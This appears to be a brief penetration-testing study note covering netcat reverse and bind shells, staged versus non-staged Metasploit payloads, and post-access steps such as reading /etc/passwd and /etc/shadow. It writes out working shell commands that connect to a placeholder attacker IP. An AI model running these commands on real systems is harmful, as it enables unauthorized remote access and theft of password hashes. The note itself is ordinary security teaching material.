# Exploitation Basics

## 1. Shell

**Reverse Shell** : The target connects to the attacker.

**Bind Shell** : The attacker connects to the target.

### 1.1. Reverse Shell

!!! danger "Example"
    === "Attacker"

        ```sh
        nc -nvlp 4444
        ```

    === "Target"

        ```sh
        nc <attacker IP> 4444 -e /bin/sh
        ```

### 1.2. Bind Shell

!!! danger "Example"
    === "Attacker"

        ```sh
        nc <target IP> 4444
        ```

    === "Target"

        ```sh
        nc -nvlp 4444 -e /bin/sh
        ```

## 2. Payloads

**Non-staged**|**Staged**
:-:|:-:
Sends exploit shellcode all at once|Sends payload in stages
Larger in size and won't always work|Can be less stable
Example: windows/meterpreter`_`reverse_tcp|Example: windows/meterpreter`/`reverse_tcp

## 3. Basic commands once we have access to the machine

- Try to find the IP(s) of the machine
- Check the arp table / route
- Check the sudo privileges
- Check the `/etc/passwd` file in order to see the different users of the machine (from 500)
- Check the `/etc/shadow` file in order to see the password hashes.

## 4. Brute Force Attacks
